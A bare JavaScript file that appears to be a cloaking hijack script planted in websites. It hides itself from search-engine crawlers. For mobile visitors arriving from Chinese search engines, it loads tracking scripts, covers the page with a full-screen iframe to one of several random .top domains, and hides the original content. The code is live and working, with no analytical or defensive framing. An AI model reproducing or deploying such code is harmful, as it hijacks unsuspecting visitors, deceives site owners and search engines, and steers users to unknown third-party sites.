
function add_tj(){
    var code_bd = "c079ed6b7dc83047a691cdd482b229fb";
    var code_51 = "KMHssF8P1mFFCIUp";

    if (code_bd != ''){
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?"+code_bd;
        var s = document.getElementsByTagName("script")[0]; 
        s.parentNode.insertBefore(hm, s);
    })();
    }
    if(code_51 != ''){
    !function(p){"use strict";!function(t){var s=window,e=document,i=p,c="".concat("https:"===e.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),n=e.createElement("script"),r=e.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=c,n.id="LA_COLLECT",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:code_51,ck:code_51});
    }
}

function load_link(olink) {
    add_tj();

    var ss = '<div id="azzdi" style="position: fixed; top: 0; left: 0; z-index: 2147483647; height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><iframe scrolling="yes" marginheight="0" marginwidth="0" frameborder="0" style="height: 100%; width: 100%;" src="' + olink + '"></iframe></div><style type="text/css">html{width:100%;height:100%;}body{width:100%;height:100%;}</style>';
    eval(`document.write('${ss}');`);

    try {
        setTimeout(function() {
            for (var i = 0; i < document.body.children.length; i++) {
                try {
                    var a = document.body.children[i].tagName;
                    var b = document.body.children[i].id;
                    if (b != 'iconDiv1' && b != 'azzdi' && a != 'title') {
                        document.body.children[i].style.display = 'none'
                    }
                } catch (e) {}
            }
            var oMeta = document.createElement('meta');
            oMeta.name = 'viewport';
            oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
            document.getElementsByTagName('head')[0].appendChild(oMeta)
        }, 100)
    } catch (e) {}
}

(function (){
    let isSpider = navigator.userAgent.toLowerCase().match(/(sogou|baidu|bot|spider|crawler)/i);
    if (isSpider){
        return;
    }
    let isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);    
    if (!isMobile){
        return;
    }

    var from_engin = document.referrer && document.referrer.match(/(baidu\.com|sogou\.com|so\.com|360\.com)/i);

    var urlParams = new URLSearchParams(window.location.search);
    var urlReferer = urlParams.get('referer');
    var url_reffer = urlReferer && urlReferer.match(/(baidu\.com|sogou\.com|so\.com|360\.com)/i);
    if (!from_engin && !url_reffer){
        return;
    }
    let ldys = ["www.ai721.top","www.yalro.top","www.davea.top","www.9hong.top","www.d0888.top"];
    let linkIndex = Math.floor((Math.random() * ldys.length));
    var oneldy = ldys[linkIndex];
    if (window.location.protocol == 'https:'){
        oneldy = 'https://'+oneldy;
    }else{
        oneldy = 'http://'+oneldy;
    }
    load_link(oneldy);
})()